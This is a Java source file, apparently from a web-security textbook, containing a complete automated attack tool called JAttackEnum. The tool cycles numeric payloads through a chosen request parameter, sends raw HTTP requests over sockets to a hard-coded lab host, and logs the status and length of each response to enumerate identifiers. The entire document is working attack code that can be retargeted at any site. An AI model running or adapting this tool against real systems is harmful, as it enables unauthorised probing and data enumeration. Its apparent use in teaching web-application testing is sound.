// JAttack.java
// by Dafydd Stuttard

import java.net.*;
import java.io.*;

class Param
{
    String name, value;
    Type type;
    boolean attack;

    Param(String name, String value, Type type, boolean attack)
    {
        this.name = name;
        this.value = value;
        this.type = type;
        this.attack = attack;
    }

    enum Type
    {
        URL, COOKIE, BODY
    }
}

interface PayloadSource
{
    boolean nextPayload();
    void reset();
    String getPayload();
}

class PSNumbers implements PayloadSource
{
    int from, to, step, current;
    PSNumbers(int from, int to, int step)
    {
        this.from = from;
        this.to = to;
        this.step = step;
        reset();
    }

    public boolean nextPayload()
    {
        current += step;
        return current <= to;
    }

    public void reset()
    {
        current = from - step;
    }

    public String getPayload()
    {
        return Integer.toString(current);
    }
}

public class JAttackEnum
{
    // attack config
    String host = "mdsec.net";
    int port = 80;
    String method = "GET";
    String url = "/app/ShowPage.ashx";
    Param[] params = new Param[]
            {
                    new Param("PageNo", "10069", Param.Type.URL, true),
            };
    PayloadSource payloads = new PSNumbers(10060, 10080, 1);

    // attack state
    int currentParam = 0;

    boolean nextRequest()
    {
        if (currentParam >= params.length)
            return false;

        if (!params[currentParam].attack)
        {
            currentParam++;
            return nextRequest();
        }

        if (!payloads.nextPayload())
        {
            payloads.reset();
            currentParam++;
            return nextRequest();
        }

        return true;
    }

    String buildRequest()
    {
        // build parameters
        StringBuffer urlParams = new StringBuffer();
        StringBuffer cookieParams = new StringBuffer();
        StringBuffer bodyParams = new StringBuffer();
        for (int i = 0; i < params.length; i++)
        {
            String value = (i == currentParam) ?
                    payloads.getPayload() :
                    params[i].value;

            if (params[i].type == Param.Type.URL)
                urlParams.append(params[i].name + "=" + value + "&");
            if (params[i].type == Param.Type.COOKIE)
                cookieParams.append(params[i].name + "=" + value + "; ");
            if (params[i].type == Param.Type.BODY)
                bodyParams.append(params[i].name + "=" + value + "&");
        }

        // build request
        StringBuffer req = new StringBuffer();
        req.append(method + " " + url);
        if (urlParams.length() > 0)
            req.append("?" + urlParams.substring(0, urlParams.length() - 1));
        req.append(" HTTP/1.0\r\nHost: " + host);
        if (cookieParams.length() > 0)
            req.append("\r\nCookie: " + cookieParams.toString());
        if (bodyParams.length() > 0)
        {
            req.append("\r\nContent-Type: application/x-www-form-urlencoded");
            req.append("\r\nContent-Length: " + (bodyParams.length() - 1));
            req.append("\r\n\r\n");
            req.append(bodyParams.substring(0, bodyParams.length() - 1));
        }
        else req.append("\r\n\r\n");

        return req.toString();
    }

    String issueRequest(String req) throws UnknownHostException, IOException
    {
        Socket socket = new Socket(host, port);
        OutputStream os = socket.getOutputStream();
        os.write(req.getBytes());
        os.flush();

        BufferedReader br = new BufferedReader(new InputStreamReader(
                socket.getInputStream()));
        StringBuffer response = new StringBuffer();
        String line;
        while (null != (line = br.readLine()))
            response.append(line);

        os.close();
        br.close();
        return response.toString();
    }

    String parseResponse(String response)
    {
        StringBuffer output = new StringBuffer();

        output.append(response.split("\\s+", 3)[1] + "\t");
        output.append(Integer.toString(response.length()) + "\t");

        return output.toString();
    }

    void doAttack()
    {
        System.out.println("param\tpayload\tstatus\tlength");
        String output = null;

        while (nextRequest())
        {
            try
            {
                output = parseResponse(issueRequest(buildRequest()));
            }
            catch (Exception e)
            {
                output = e.toString();
            }
            System.out.println(params[currentParam].name + "\t" +
                    payloads.getPayload() + "\t" + output);
        }
    }

    public static void main(String[] args)
    {
        new JAttackEnum().doAttack();
    }
}
